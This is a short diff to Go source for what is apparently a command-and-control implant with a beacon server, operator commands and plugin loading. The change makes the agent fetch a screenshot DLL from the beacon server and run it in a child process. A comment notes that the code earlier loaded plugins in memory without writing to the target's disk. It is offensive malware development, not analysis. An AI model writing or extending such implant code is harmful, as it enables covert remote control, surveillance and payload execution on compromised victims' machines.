@@ -96,6 +96,13 @@ var (
 )
 
 func main() {
+	if len(os.Args) > 1 && os.Args[1] == "--plugin-child" {
+		if err := runPluginChild(os.Args[1:]); err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(3)
+		}
+		return
+	}
 	initAgentLog()
 	cfg, err := loadConfig()
 	if err != nil {
@@ -373,7 +380,7 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 		return result, "output"
 	}
 	if strings.HasPrefix(trimmed, "__SCREENSHOT__") {
-		result, err := captureScreenshot()
+		result, err := loadPluginPE(client, cfg, "/tools/plugins/screenshot.dll", "Run", "")
 		if err != nil {
 			return "Screenshot failed: " + err.Error(), "output"
 		}
@@ -411,8 +418,7 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 }
 
 // loadPluginCommand parses the __PE_LOAD__ operator command. The plugin is
-// fetched from the beacon server on demand and mapped in memory; no file
-// is written to the target disk.
+// fetched from the beacon server on demand and executed in a child process.
 func loadPluginCommand(client *http.Client, cfg *config, command string) (string, error) {
 	fields := strings.SplitN(strings.TrimSpace(command), " ", 4)
 	if len(fields) < 2 || fields[1] == "" {
